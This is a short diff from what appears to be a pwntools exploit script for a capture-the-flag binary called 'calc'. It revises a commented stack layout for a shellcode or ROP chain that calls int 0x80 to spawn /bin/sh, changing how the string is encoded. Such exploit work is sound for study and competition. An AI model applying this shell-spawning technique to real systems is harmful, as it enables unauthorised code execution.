@@ -9,8 +9,8 @@ from pwn import *
 +365 => 0
 +366 => address of /bin//sh
 +367 => int 0x80
-+368 => //sh 0x68732f2f
-+369 => /bin 0x6e69622f
++368 => /bin 0x6e69622f
++369 => /sh\x00 0x0068732f
 """
 
 #r = process('./calc')
